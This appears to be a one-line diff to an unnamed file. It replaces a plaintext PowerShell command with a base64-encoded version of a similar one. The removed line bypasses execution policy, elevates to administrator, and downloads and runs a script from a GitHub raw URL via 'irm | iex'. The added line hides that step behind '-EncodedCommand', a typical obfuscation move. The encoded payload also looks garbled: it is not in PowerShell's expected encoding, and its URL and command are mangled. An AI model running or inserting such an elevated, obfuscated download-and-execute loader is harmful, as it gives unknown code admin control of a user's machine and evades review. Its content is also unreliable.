@@ -1,1 +1,1 @@
-powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command irm ''https://github.com/AmjadBalls/TEST/raw/refs/heads/main/I'' | iex' -Verb RunAs"
+powershell.exe -ExecutionPolicy Bypass -EncodedCommand "W1N0YXJ0LVByb2Nlc3MgUG93ZXJTaGVsbCAtQXJndW1lbnRMaXN0ICctTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIGlybSAnaHR0cHM6Ly9naXRodWIuY29tL0FtamFkQmFsbHMuVEVTVC9yYXdSZWZzL2hlYWRzL21haW4vST8nIHwgZXhlbGl4Ig=="
